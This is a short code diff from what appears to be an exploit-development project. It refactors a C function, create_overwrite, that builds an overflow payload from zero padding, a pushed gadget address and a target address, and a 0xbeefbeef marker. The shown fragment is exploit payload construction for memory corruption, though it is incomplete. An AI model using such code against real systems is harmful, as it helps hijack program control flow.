@@ -271,12 +271,15 @@ v8 create_overwrite(uint64_t nop_gadget, uint64_t addr) {
     v64_push(&block1, nop_gadget);
     v64_push(&block1, addr);
 
+    v8 z16 = v8_zeros(16);
+    v8 z32 = v8_zeros(32);
+
     v8 ret = v8_new(0x580);
     v8_append(&ret, v8_zeros(padd));            // '\0' * 0x500
-    v8_append(&ret, v8_zeros(32));              // 32x
+    v8_append(&ret, z32);                       // 32x
     v8_append(&ret, v64_convert_v8(block1));    // 2Q
-    v8_append(&ret, v8_zeros(16));              // 16x
-    v8_append(&ret, v8_zeros(32));              // 32x
+    v8_append(&ret, z16);                       // 16x
+    v8_append(&ret, z32);                       // 32x
     v8_append(&ret, v64_convert_v8(block1));    // 2Q
     v8_append(&ret, v8_zeros(12));              // 12x
     v8_push_u32(&ret, 0xbeefbeef);              // I
